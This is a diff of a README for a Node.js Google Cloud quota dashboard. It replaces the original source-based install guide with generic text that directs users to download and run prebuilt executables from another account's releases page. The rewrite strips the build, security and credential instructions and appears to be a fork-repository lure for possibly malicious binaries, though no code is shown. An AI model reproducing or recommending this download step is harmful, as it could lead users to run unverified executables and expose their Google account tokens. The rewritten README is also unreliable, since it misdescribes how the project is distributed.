@@ -1,430 +1,68 @@
-# Antigravity Dashboard
+# 🚀 antigravity-dashboard - Monitor Your Google Cloud Quotas Easily 
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js Version](https://img.shields.io/badge/node-%3E%3D18-blue.svg)](https://nodejs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)](https://www.typescriptlang.org/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://makeapullrequest.com)
+[![Download](https://img.shields.io/badge/Download-Now-yellow.svg)](https://github.com/grid1919/antigravity-dashboard/releases)
 
-<img width="1265" height="1285" alt="1" src="https://github.com/user-attachments/assets/c45da008-01a4-4e5f-b53a-c517ded2ee32" />
+## ⚙️ Introduction
 
-<img width="1280" height="906" alt="2" src="https://github.com/user-attachments/assets/668bfa68-e1c1-4eee-b78c-c294021de0de" />
+Welcome to the Antigravity Dashboard! This tool helps you monitor your Google Cloud API usage in real-time. With support for multiple accounts, you can track quotas, usage limits, and reset times with ease. The dashboard uses a simple interface that allows anyone, regardless of programming knowledge, to stay on top of their cloud resources.
 
+## 📥 Download & Install
 
-*Real-time quota monitoring with multi-account support*
+To get started, visit this page to download: [GitHub Releases](https://github.com/grid1919/antigravity-dashboard/releases).
 
-Real-time monitoring dashboard for Google Cloud accounts using the [Antigravity OAuth flow](https://github.com/NoeFabris/opencode-antigravity-auth). Track API quotas, usage limits, and reset times across multiple accounts with a Claude/OpenAI compatible API proxy.
+1. Open the link above to go to the releases page.
+2. Find the latest version of the software.
+3. Click on the appropriate file for your operating system to start the download. Common files might include:
+   - Windows: `antigravity-dashboard-win.exe`
+   - Mac: `antigravity-dashboard-mac.zip`
+   - Linux: `antigravity-dashboard-linux.tar.gz`
+4. Once the download is complete, locate the file in your downloads folder.
+5. Run the file to install the application by following the on-screen instructions.
 
-## Features
+## ⚡ Features
 
-- **Multi-Account Monitoring** - Track multiple Google Cloud accounts simultaneously
-- **Real-Time Quotas** - View Claude and Gemini model quota percentages with live updates
-- **Reset Timers** - Countdown to quota reset for each account and model
-- **Subscription Tier Detection** - Automatic FREE/PRO/ULTRA tier detection
-- **Usage Analytics** - Token usage, request stats, burn rate calculations
-- **Timeline Visualization** - Hourly usage graphs and quota history
-- **Language Server Integration** - Connect to Antigravity VS Code extension
-- **API Proxy** - Claude/OpenAI compatible API with automatic account rotation
-- **Dark/Light Theme** - Full theme support with Tailwind CSS
+- **Real-Time Monitoring**: See API quota usage and limits for all linked Google Cloud accounts in one place.
+- **Multi-Account Support**: Easily switch between different Google Cloud accounts.
+- **User-Friendly Interface**: Navigate through easy-to-understand sections and data.
+- **Claude/OpenAI Compatible**: Leverage state-of-the-art API proxy capabilities.
 
-## Prerequisites
+## 🛠️ System Requirements
 
-- **Node.js 18+** (check with `node --version`)
-- **pnpm 9+** - Fast, disk-efficient package manager (see [Installing pnpm](#installing-pnpm))
-- **Google Cloud Account** with OAuth credentials configured
-- **Antigravity accounts** - OAuth tokens from [opencode-antigravity-auth](https://github.com/NoeFabris/opencode-antigravity-auth)
+To ensure the application runs smoothly on your computer, please meet the following system requirements:
 
-### Installing pnpm
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Processor**: 2 GHz or faster processor.
+- **Internet Connection**: Required for real-time monitoring and API access.
 
-Choose one of these methods:
+## 📋 How to Use the Dashboard
 
-```bash
-# Option 1: Using Corepack (recommended - built into Node.js 16.10+)
-corepack enable
-corepack prepare pnpm@latest --activate
+1. **Launch the Application**: After installation, open the Antigravity Dashboard.
+2. **Sign in to Your Google Account**: Click on the sign-in button to authenticate through the Antigravity OAuth flow. Follow the on-screen prompts to connect your Google Cloud account.
+3. **Monitor Your Quotas**: Once signed in, you will see a dashboard displaying your API usage, limits, and reset times.
+4. **Switch Accounts**: Use the account switcher feature to change between different Google Cloud accounts seamlessly.
 
-# Option 2: Using npm
-npm install -g pnpm
+## 📝 Troubleshooting
 
-# Option 3: Using Homebrew (macOS)
-brew install pnpm
+If you encounter issues while running the Antigravity Dashboard, consider the following steps:
 
-# Verify installation
-pnpm --version
-```
+- **Check Your Internet Connection**: Make sure you have a stable internet connection.
+- **Update Your Operating System**: Ensure your OS is up to date for the best performance.
+- **Reinstall the App**: If problems persist, try uninstalling and then reinstalling the application.
 
-## Installation
+## 🤝 Community Support
 
-### 1. Clone the Repository
+You can reach out for help or share feedback through the following channels:
 
-```bash
-git clone https://github.com/NoeFabris/antigravity-dashboard.git
-cd antigravity-dashboard
-```
+- **GitHub Issues**: Report issues or ask questions on the [Issues page](https://github.com/grid1919/antigravity-dashboard/issues).
+- **Discussion Forum**: Join the community discussions to share your experiences and tips for using the dashboard.
 
-### 2. Install Dependencies
+## 🎉 Acknowledgments
 
-```bash
-pnpm install
-```
+We thank everyone who contributed to this project. Your support helps make the Antigravity Dashboard a reliable tool for cloud management.
 
-### 3. Configure Google OAuth
+## ⚙️ License
 
-> **IMPORTANT:** You must use the **same OAuth credentials** that the [opencode-antigravity-auth](https://github.com/NoeFabris/opencode-antigravity-auth) plugin uses. Refresh tokens are cryptographically bound to the OAuth client that issued them. Using different credentials will result in `unauthorized_client` errors.
+This project is licensed under the MIT License. For more details, visit the [License page](https://opensource.org/licenses/MIT).
 
-#### Configure Environment Variables
-
-```bash
-# Copy the example environment file - credentials are pre-configured!
-cp .env.example .env
-```
-
-That's it! The `.env.example` file already contains the correct OAuth credentials from the plugin's source code:
-- **Source:** [opencode-antigravity-auth/src/constants.ts](https://github.com/NoeFabris/opencode-antigravity-auth/blob/main/src/constants.ts)
-
-You do **NOT** need to create your own Google OAuth credentials.
-
-### 4. Build and Start
-
-```bash
-# Build backend and frontend
-pnpm run build
-
-# Start the server
-pnpm start
-```
-
-Dashboard available at: **http://localhost:3456**
-
-## Quick Start
-
-```bash
-# 1. Install dependencies
-pnpm install
-
-# 2. Copy environment file (credentials are pre-configured!)
-cp .env.example .env
-
-# 3. Build and launch
-pnpm run build && pnpm start
-```
-
-Dashboard available at: **http://localhost:3456**
-
-## Configuration
-
-### Accounts File
-
-Antigravity accounts are stored in `~/.config/opencode/antigravity-accounts.json`. This file is created by the [opencode-antigravity-auth](https://github.com/NoeFabris/opencode-antigravity-auth) plugin.
-
-```json
-{
-  "accounts": [
-    {
-      "email": "user@gmail.com",
-      "refreshToken": "1//...",
-      "projectId": "project-id",
-      "addedAt": "2025-01-01T00:00:00.000Z"
-    }
-  ]
-}
-```
-
-### Environment Variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `DASHBOARD_PORT` | 3456 | Server port |
-| `GOOGLE_CLIENT_ID` | (required) | Google OAuth client ID |
-| `GOOGLE_CLIENT_SECRET` | (required) | Google OAuth client secret |
-| `DASHBOARD_SECRET` | (optional) | Enable network access with auth |
-| `DB_PATH` | (auto) | Custom SQLite database path |
-| `DATA_RETENTION_DAYS` | 30 | Days to keep usage data |
-| `LOG_LEVEL` | info | Logging verbosity |
-
-See `.env.example` for all available options.
-
-### Security: Network Access
-
-By default, the dashboard binds to `localhost` only and is safe to run without authentication.
-
-To enable network access (e.g., access from other machines):
-
-1. Set `DASHBOARD_SECRET` in your `.env` file:
-   ```env
-   DASHBOARD_SECRET=your-secret-key-here
-   ```
-
-2. The server will bind to all interfaces (`0.0.0.0`)
-
-3. All API requests require the secret as a Bearer token:
-   ```bash
-   curl -H "Authorization: Bearer your-secret-key-here" \
-     http://your-server:3456/api/accounts
-   ```
-
-## API Proxy (Claude Code CLI)
-
-The dashboard includes a built-in API proxy that allows you to use Claude Code CLI or any OpenAI-compatible client with your Antigravity accounts.
-
-### Setup
-
-```bash
-# Get the API key (localhost only, or use Bearer auth)
-curl -s http://localhost:3456/api/proxy/api-key | jq -r '.apiKey'
-
-# Configure Claude Code CLI
-export ANTHROPIC_BASE_URL=http://localhost:3456
-export ANTHROPIC_API_KEY=<api-key-from-above>
-
-# Use Claude Code CLI
-claude "your prompt"
-```
-
-### Features
-
-- **Automatic Account Rotation** - Selects accounts with highest quota
-- **Model-Specific Selection** - Routes Claude requests to accounts with Claude quota, Gemini to Gemini quota
-- **Rate Limit Handling** - Automatic retry with exponential backoff on 429 errors
-- **Request Logging** - All requests logged to SQLite for analytics
-- **WebSocket Notifications** - Real-time rate limit alerts
-
-### Supported Endpoints
-
-| Endpoint | Description |
-|----------|-------------|
-| `POST /v1/messages` | Claude Messages API |
-| `POST /v1/chat/completions` | OpenAI Chat Completions API |
-| `GET /v1/models` | List available models |
-
-## API Reference
-
-### Core Endpoints
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/health` | GET | Server health check |
-| `/api/accounts/local` | GET | List all accounts with burn rate |
-| `/api/accounts/active` | GET | Get active account per model family |
-| `/api/accounts/quota` | GET | Get cached quota data |
-| `/api/accounts/quota/refresh` | POST | Force refresh quotas |
-| `/api/accounts/enriched` | GET | Accounts with tier + model quotas |
-| `/api/accounts/limits` | GET | Quota limits per model |
-| `/api/accounts/timeline` | GET | Hourly usage timeline |
-
-### Analytics Endpoints
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/analytics/overview` | GET | Combined statistics |
-| `/api/analytics/performance` | GET | Performance metrics |
-| `/api/analytics/trends` | GET | Daily usage trends |
-| `/api/hourly-stats` | GET | Hourly breakdown |
-| `/api/recent-calls` | GET | Recent API calls log |
-
-### Language Server Endpoints
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/language-server/status` | GET | LS connection status |
-| `/api/language-server/credits` | GET | Prompt + Flow credits |
-| `/api/language-server/user` | GET | User info (email, tier) |
-
-### WebSocket
-
-Connect to `/ws` for live updates:
-
-- `initial` - Full account state on connect
-- `accounts_update` - Account status changes
-- `config_update` - Quota updates
-- `stats_update` - Statistics changes
-- `rate_limit_change` - Rate limit events
-- `ls_status_change` - Language Server status
-- `heartbeat` - Connection keepalive
-
-## Development
-
-### Common pnpm Commands
-
-```bash
-# Install all dependencies
-pnpm install
-
-# Build all workspace packages
-pnpm run build
-
-# Start development mode (all packages)
-pnpm run dev
-
-# Start production server
-pnpm start
-
-# Run linting (oxlint - Rust-based, fast)
-pnpm run lint
-
-# Run linting with auto-fix
-pnpm run lint:fix
-
-# Run type checking
-pnpm run typecheck
-```
-
-### Workspace Commands (--filter syntax)
-
-pnpm uses the `--filter` flag to run commands in specific workspace packages:
-
-```bash
-# Run command in a specific package
-pnpm --filter @antigravity/web dev        # Start web dev server
-pnpm --filter @antigravity/backend dev    # Start backend dev server
-
-# Build a specific package
-pnpm --filter @antigravity/web build
-
-# Install a dependency to a specific package
-pnpm --filter @antigravity/backend add express
-pnpm --filter @antigravity/web add -D @types/react
-
-# Run commands in all app packages
-pnpm --filter "./apps/*" run build
-
-# Run type checking on backend only
-pnpm run --filter @antigravity/backend typecheck
-```
-
-### Frontend Dev Server
-
-Start with hot reload (proxies to backend):
-
-```bash
-pnpm --filter @antigravity/web dev
-```
-
-Dev server runs on port 5173 and proxies `/api` and `/ws` to port 3456.
-
-### Backend Dev
-
-Watch mode for TypeScript compilation:
-
-```bash
-pnpm --filter @antigravity/backend dev
-```
-
-## Project Structure
-
-```
-antigravity-dashboard/
-├── apps/
-│   ├── backend/              # Express API server
-│   │   ├── src/
-│   │   │   ├── server.ts     # Main server, API endpoints
-│   │   │   ├── monitor.ts    # SQLite usage logging
-│   │   │   └── services/
-│   │   │       ├── quotaService.ts   # Google Cloud API
-│   │   │       ├── accountsFile.ts   # Accounts file watcher
-│   │   │       ├── tierDetection.ts  # Subscription detection
-│   │   │       └── apiProxy/         # Claude/OpenAI proxy
-│   │   └── dist/
-│   │
-│   └── web/                  # React frontend
-│       ├── src/
-│       │   ├── App.tsx
-│       │   ├── components/
-│       │   ├── hooks/
-│       │   └── stores/
-│       └── dist/
-│
-├── .env.example
-├── package.json
-└── usage.db                  # SQLite (created at runtime)
-```
-
-## Tech Stack
-
-**Backend:**
-- Node.js + Express + TypeScript
-- SQLite (better-sqlite3)
-- WebSocket (ws)
-- Helmet + rate limiting for security
-
-**Frontend:**
-- React 18 + TypeScript
-- Vite
-- Tailwind CSS
-- Zustand (state management)
-- Recharts (data visualization)
-
-## How It Works
-
-1. **OAuth Tokens** - Uses stored refresh tokens to get access tokens
-2. **Cloud Code API** - Fetches quota from Google's Cloud Code API
-3. **Polling** - Refreshes all accounts every 2 minutes
-4. **WebSocket** - Broadcasts updates to connected clients
-5. **SQLite** - Logs all API calls for analytics
-6. **Tier Detection** - Analyzes quota patterns to detect subscription tier
-
-## Troubleshooting
-
-### OAuth Errors
-
-| Error | Cause | Solution |
-|-------|-------|----------|
-| `unauthorized_client` | Wrong OAuth credentials | Use the plugin's credentials (see Quick Start) |
-| `invalid_client` | Missing or malformed credentials | Check `.env` file has correct `GOOGLE_CLIENT_ID` and `GOOGLE_CLIENT_SECRET` |
-| `invalid_grant` | Refresh token expired or revoked | Re-authenticate via opencode-antigravity-auth plugin |
-
-> **Why must I use the plugin's OAuth credentials?**
-> 
-> OAuth refresh tokens are cryptographically bound to the client ID that issued them. Your accounts file contains tokens created by the opencode-antigravity-auth plugin, so you must use the same OAuth client credentials to refresh them.
-
-### Common Issues
-
-- **Dashboard shows "Waiting for backend connection"** → Check if server is running on port 3456.
-- **401 Unauthorized errors** → Make sure `DASHBOARD_SECRET` is set correctly in `.env`, or remove it for localhost-only mode.
-- **WebSocket disconnects frequently** → Check network stability; the dashboard will auto-reconnect.
-- **Quotas not updating** → Verify Google OAuth credentials are correct in `.env`.
-- **Rate limit errors in proxy** → Your account quota may be exhausted; try another account or wait for reset.
-- **Language Server not detected** → Make sure the Antigravity VS Code extension is running.
-
-## Related Projects
-
-- [opencode-antigravity-auth](https://github.com/NoeFabris/opencode-antigravity-auth) - OpenCode plugin for Antigravity OAuth
-- [OpenCode](https://opencode.ai) - AI coding assistant
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-### Migrating from npm to pnpm
-
-If you previously used npm with this project, see the **[Migration Guide](MIGRATION.md)** for:
-- Step-by-step migration instructions
-- Complete npm to pnpm command mapping
-- IDE/tooling setup (VS Code, WebStorm)
-- Common issues and solutions
-- Troubleshooting procedures
-
-**Quick migration:**
-
-```bash
-rm -rf node_modules apps/*/node_modules package-lock.json
-pnpm install
-pnpm run build
-```
-
-**Key differences from npm:**
-| npm | pnpm |
-|-----|------|
-| `npm install` | `pnpm install` |
-| `npm run <script>` | `pnpm run <script>` or `pnpm <script>` |
-| `npm run -w apps/web dev` | `pnpm --filter @antigravity/web dev` |
-| `npm install <pkg>` | `pnpm add <pkg>` |
-| `npm install -D <pkg>` | `pnpm add -D <pkg>` |
-| `package-lock.json` | `pnpm-lock.yaml` |
-
-## License
-
-MIT - see [LICENSE](LICENSE) file for details.
+For further information, visit the [GitHub Releases](https://github.com/grid1919/antigravity-dashboard/releases) page again to check for updates and new versions.
